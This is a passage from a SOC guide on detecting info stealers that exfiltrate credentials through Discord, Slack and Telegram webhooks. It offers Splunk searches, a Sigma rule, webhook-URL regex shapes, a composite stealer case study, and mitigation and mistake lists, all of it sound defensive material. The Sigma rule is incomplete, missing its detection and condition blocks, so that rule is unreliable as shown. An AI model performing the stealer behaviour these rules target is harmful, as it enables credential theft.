| eval chat_ev=if(isnotnull(urlHost),1,0)
| bin _time span=15m
| stats max(archive_ev) as had_archive max(chat_ev) as had_chat
        values(TargetFilename) as archives values(urlHost) as chat_hosts
        sum(eval(coalesce(bytes_out,0))) as bytes_out
        by artifact, _time
| where had_archive=1 AND had_chat=1
| sort - _time

The join key is the host (server) on the Sysmon side and the source IP on the proxy side, unified by artifact. An asset-to-IP lookup (a CMDB — configuration management database — export) would make this exact. One 15-minute bucket containing both an archive event and chat-API egress is the alert.

Rule 7 · DNS first-seen resolution of chat API domains (Threat 1 companion)

Severity: high. This is the alert that fired in the case study and the number-one detection in the cheat sheet. The Sigma rule expresses the shape filters that run anywhere; the first-seen state is a baseline, which the SPL below implements with a lookup table.

Sigma · chat_api_dns_resolution.yml
title: Chat API Domain Resolution from a Non-Browser Process
id: 3a7d1f42-8c25-4b9e-a6d3-51e0b9c7f482
status: experimental
description: Detects DNS resolution of chat API domains (Discord, Slack, Telegram)
  from a non-browser process. Pair it with the per-host first-seen baseline in the
  SPL below to reproduce the alert used in the case study.

  - https://attack.mitre.org/techniques/T1567/004/
author: SOC Guide Builders
date: 2025-02-14
logsource:
  category: dns
  product: any

  selection_chat_domains:
    query|endswith:
      - 'discord.com'

      - 'api.telegram.org'

Mapping: category: dns maps to any resolver or DNS-security product log; query, clientIp, and processName follow common DNS-log field conventions, so rename them to match your pipeline. Sigma cannot express a first-seen baseline — the SPL below carries that part, exactly as described in 5.4 Threat 1. False positives: approved tooling that resolves chat domains directly. Tuning: keep the baseline per host and per domain over a 30-day window. Drop the browser filter only if your DNS log carries no process field. Lower the level to medium for estates where chat use is normal on workstations.

Splunk SPL · first-seen chat API resolution per host
index=dns sourcetype=structured_dns:query
    (query="*discord.com" OR query="*slack.com" OR query="*api.telegram.org" OR query="*hooks.slack.com")
    NOT processName IN ("*\\chrome.exe","*\\msedge.exe","*\\firefox.exe")
| eval query=rtrim(query,".")
| stats min(_time) as first_seen max(_time) as last_seen count as lookups
        values(processName) as processes by clientIp, query
| lookup chat_api_dns_baseline clientIp, query OUTPUT seen_before
| where isnull(seen_before)
| eval first_seen=strftime(first_seen,"%Y-%m-%d %H:%M:%S")
| sort - first_seen

The lookup chat_api_dns_baseline stores host/domain pairs already seen; a scheduled summary search builds and refreshes it. A match with no row means first-seen for that host. If your DNS log has no processName field, drop the NOT line and triage every first-seen chat domain by hand. Replace index=dns, the sourcetype, and the lookup name with your own.

Real-World Case Study

"Project Violet Hook" — an illustrative composite based on widely reported 2021–2024 Discord-webhook stealer waves, rebuilt as one timeline a mid-market SOC could actually walk through.

⚠ Warning — composite case. This case study is an illustrative composite: the company, people, host names, and timings are fictional, but every step follows patterns described in public reporting on Discord-webhook info stealers. It is written to be used in training, not as a record of one specific incident.

Context

A 400-person finance and logistics firm runs a small SOC with a SIEM, EDR on all endpoints, and DNS and proxy logging. It has no chat-API egress policy — Discord, Slack, and Telegram were allowed everywhere because "sales needs them". A finance clerk, "J.", searches for a free invoice-numbering add-in, lands on a software-cracking site, and downloads a fake installer. Within three minutes the bundled info stealer has read the browser password store and cookies, packed the data into a ZIP, and posted it to the operator's Discord webhook. The SOC's first signal is a DNS first-seen alert at 09:47 — four minutes after the stolen archive left the network.

Timeline

  • Day 1 · 09:41

    Download

    J. downloads InvoiceTool-Pro-Setup.exe from a cracked-software site and runs it. EDR records the file; its reputation verdict is still pending, so nothing blocks.

  • Day 1 · 09:42

    Stealer executes and collects

    The installer drops log_helper.exe into %TEMP% and starts it. The stealer reads browser password stores, cookie databases, saved chat-app tokens, and a wallet folder — all in user context, no UAC.

  • Day 1 · 09:43

    Packing and POST

    The stealer writes log_FIN-WS-0341.zip (~380 KB) and POSTs it, with a credentials text file, to discord.com/api/webhooks/<id>/<token>. The archive is deleted a minute later.

  • Day 1 · 09:47 — detection point

    DNS first-seen alert fires

    The SIEM rule "first-seen chat API domain from non-browser process" fires. FIN-WS-0341 resolved discord.com, and the enriching lookup shows the resolver query came from log_helper.exe, not a browser. The analyst opens the EDR process tree and sees the file-read → archive → POST chain in one view.

  • Day 1 · 09:55–10:40

    Containment

    The analyst isolates the workstation with EDR and blocks chat-API egress for the workstation VLAN (network segment). Following the new runbook, the credential reset starts from a clean device, never from the infected one. Scope: every password saved in J.'s browsers, plus the corporate SSO (single sign-on) session and webmail.

  • Day 1 · 11:00–16:00

    Eradication

    EDR sweeps the estate for the stealer family hash set and behavior (browser-store reads followed by archive creation): two more machines hit, both cleaned. The fake installer is quarantined everywhere; a "Quick Coupon Finder" browser extension J. had also installed is removed as a secondary risk.

  • Day 1–3

    Recovery

    All of J.'s sessions are revoked, MFA (multi-factor authentication) is re-enrolled with a hardware token, and saved passwords are migrated into the corporate password manager. The team monitors identity logs and dark-web credential dumps for the harvested set; two attempts to sign in from an unusual region are blocked by the new MFA.

  • Week 2

    Impact and follow-up

    One compromised mailbox is used for an $18,000 business-email-compromise attempt against a supplier. The finance team's new verbal-verification rule catches it, so no money is lost. The stolen data itself was limited to J.'s browser profile; no file server or domain compromise was found.

Team response and communication

The SOC paged the security lead at 09:48 and IT operations by 10:00, with a one-paragraph summary: what happened, what was taken, what was already done. HR (human resources) and J.'s manager were briefed with a no-blame script — the user was treated as a victim, which the post-incident review credits for the fast, honest cooperation. The security lead sent a company-wide note on Day 2 describing the fake-installer pattern and pointing at the new "report suspicious downloads" button.

Lessons learned

  • Chat-API egress policy for workstations is worth the cost. Blocking, or at least proxying, chat APIs from non-browser processes would have stopped the theft at step 5 of the chain.
  • Webhook-URL regex rules scale. One rule covering discord.com/api/webhooks/ in command lines and script blocks would have caught this sample and every future one using the same family default.
  • Reset credentials from a clean device — always. Doing resets on the infected machine risks a re-steal loop; the runbook line is short and essential.
  • Browser password managers plus MFA limit the damage. With a password manager and hardware-token MFA, a browser-store stealer gets far less usable loot.
  • The fast first-seen alert made the difference. DNS first-seen, enriched with the process name, turned a silent theft into a same-hour response.

Mitigation and Defense

Layered controls that make webhook exfiltration hard: policy, identity, endpoint, network, cloud, logging, monitoring, backup, and response — plus what a small office should do first.

No single control stops this technique. Three layers together remove most of its value. Restrict where chat APIs can be reached from. Shrink the loot with password managers, MFA, and no saved browser passwords. Watch the edges with the DNS, proxy, and script-log detections from section 5. The cards below map concrete actions to each control area.

Policy & identity

  • Write an acceptable-use and egress policy that names chat, file-drop, and webhook-receiver services explicitly.
  • Make browser-saved passwords a violation: corporate password manager with SSO instead.
  • Require phishing-resistant MFA (hardware keys or authenticator apps) and short session lifetimes for webmail and SSO.
  • Run a fast, practiced credential-reset runbook — resets happen from clean devices only.

Endpoint

  • EDR with tamper protection on all hosts; alert on unsigned binaries spawning from installers in %TEMP%.
  • Enable PowerShell script-block logging (4104) and module logging fleet-wide.
  • Browser policy: block non-store extensions, force-install the password manager, alert on extension permission grants.
  • Patch and restrict archive tools; on servers, treat archive creation as an exception to review.

Network & cloud

  • Block or proxy chat-API egress from workstations and block it entirely from servers and CI runners.
  • Keep an egress allow-list for runners and service identities; review it quarterly.
  • Log DNS and proxy/SWG fully (with SNI) and ship both to the SIEM — these are the prerequisites for every detection in section 5.
  • Use CASB/SaaS controls to spot odd app permissions and connectors in your chat tenants.

Logging, monitoring, backup & response

  • Centralize Sysmon/EDR, DNS, proxy, PowerShell, and identity logs with sane retention (hot 90 days, cold 1 year+).
  • Deploy the Sigma/SPL rules from 5.5; tune false positives weekly during the first month.
  • Keep offline, tested backups — they limit leverage if exfiltration precedes encryption.
  • Rehearse the stealer scenario yearly: isolate → reset from clean device → sweep → hunt the URL pattern estate-wide.

Home and small-office advice

  • Use a password manager and turn on MFA everywhere — an authenticator app or hardware key beats SMS.
  • Do not install cracked software; the "free tool" is the delivery method in most stealer cases.
  • Sign out of browser profiles you do not use, and never save passwords in a browser on a shared PC.
  • If your accounts feel compromised, change the password from a different, clean device and revoke active sessions in account settings.

Common Mistakes and Best Practices

Twelve concrete blue-team mistakes around webhook exfiltration — what they look like, why they happen, and how to fix and prevent each one.

1 · Chat domains allowed everywhere "because sales uses Slack"

Symptom: every workstation can reach every chat API directly; the SOC has no egress lever to pull during an incident.

Root cause: egress policy treated as all-or-nothing instead of per-purpose (browser use proxied, API calls restricted).

Fix: allow chat web apps via the proxy for the teams that need them; block direct API/webhook paths from everything else.

Prevention: a written egress matrix (who, what, from where) reviewed with business owners twice a year.

2 · DNS logged but first-seen never alerted

Symptom: resolver logs exist and are searchable, yet the stealer's first discord.com query sat unnoticed for weeks.

Root cause: logging treated as the goal; nobody built the "new domain per host" logic or the non-browser enrichment.

Fix: build a 30-day per-host domain baseline and alert on first-seen chat API domains from non-browser processes.

Prevention: a detection-coverage review that pairs every log source with at least one live rule.

3 · Credential reset performed from the infected machine

Symptom: the "cleaned" account is stolen again hours later; the EDR shows the stealer re-running.

Root cause: the runbook never said where resets happen from, and the stealer's cookie/token theft was underestimated.

Fix: treat the machine as hostile until reimaged; all resets and MFA re-enrollment from a clean device.

Prevention: one bold line at the top of the runbook: "Never reset from the infected host."

4 · Matching domains only — too many web-app false positives

Symptom: an alert on discord.com fires for hundreds of normal browser users every day and is muted within a week.

Root cause: the rule lacks the URL-path or process context that separates chatting from webhook posting.

Fix: alert on the path (/api/webhooks/, /bot…/sendDocument) at the proxy, or on non-browser processes at the endpoint.

Prevention: every new rule ships with its top-10 false positives measured in the first week and a tuning note.

5 · Alert fatigue: webhook alerts with no owner

Symptom: alerts route to a shared mailbox; nobody can say who triages them or how fast.

Root cause: detection deployed without an ownership and SLA decision.

Fix: assign each rule an owner, a severity, and a triage SLA (response-time target) in the alert platform itself.

Prevention: quarterly review that retires, tunes, or re-assigns every rule that generated no action.

6 · Missing PowerShell script-block logging

Symptom: proxy shows a webhook POST, but there is no way to see which script sent it; the insider case stalls.

Root cause: GPO (Group Policy object) for module/script-block logging never rolled out, or only on servers.

Fix: enable script-block logging (4104) fleet-wide and ship the log to the SIEM.

Prevention: a logging baseline checklist per OS (operating system) that new estates must pass before go-live.

7 · Weak tuning: regex too loose or too specific

Symptom: either "webhook" matches everything (noise), or the rule pins one attacker token and misses the very next campaign.

Root cause: rules written against one sample instead of the URL pattern family.

Fix: match shapes (/api/webhooks/[0-9]+/[\w-]+, token pattern), and test them against a month of historical data before going live.

Prevention: a small regression set of benign and malicious log lines run against every rule change.

8 · Cleaning one machine, hunting nowhere

Symptom: the incident closes after reimaging one PC; two more stealer infections surface the next month.

Root cause: no estate-wide hunt step tied to the finding.

Fix: after every confirmed case, hunt the captured URL pattern and hashes across 90 days of DNS, proxy, and EDR history.

Prevention: make "hunt estate-wide" a checkbox in the incident template before closure is allowed.

9 · No zone or asset context on egress events

Symptom: analysts cannot tell a build runner's POST from a workstation's, so CI exfiltration is invisible.

Root cause: proxy and DNS logs lack subnet, zone, or CMDB enrichment.

Fix: enrich network logs with subnet/zone and asset-role lookups at ingest or search time.

Prevention: a living CMDB export feeding the SIEM, refreshed monthly.

10 · Blunt blocking without a change process

Symptom: overnight "block discord.com" breaks deploy bots and support tooling; the block is rolled back and trust is lost.

Root cause: no inventory of legitimate chat integrations before the change.

Fix: stage blocks (monitor → restrict → block), allow-list documented integrations by path and identity.

Prevention: route every egress change through the normal change board with owners attached.

11 · Impossible-travel alerts never linked to the stealer

Symptom: identity alerts and the endpoint incident live in different tickets; the account-takeover story is missed.

Root cause: no correlation between identity and endpoint cases for the same user.

Fix: when a stealer is confirmed, check the user's identity alerts and sessions the same day; link tickets both ways.

Prevention: a case-management rule that auto-merges identity and endpoint cases for one user within 72 hours.

12 · Captured webhook URL never reported to the provider

Symptom: the same webhook keeps receiving loot from other victims — including possibly your other offices.

Root cause: responders see the URL as evidence only, not as an abusable live endpoint.

Fix: report the webhook/token or bot token to the provider (Discord, Slack, Telegram) with the case number.

Prevention: add "report live drop box to provider" to the response checklist in section 9.

Habits that keep you sharp

Daily

  • Review first-seen chat-API DNS alerts and any webhook-path proxy hits.
  • Check that EDR, DNS, and proxy feeds all arrived on time.

Weekly

  • Tune rules with the week's false positives; note changes in the rule's comments.
  • Spot-check one new or changed SaaS integration for odd egress.

Monthly

  • Hunt the current stealer URL patterns across 90 days of history.
  • Review egress allow-lists and extension inventory; report captured drop boxes still alive.

✓ Good practice. Print mistakes 2, 3, and 8 for your incident room wall. They are the three that turn a small stealer incident into either a fast save or a slow, expensive account-takeover project.
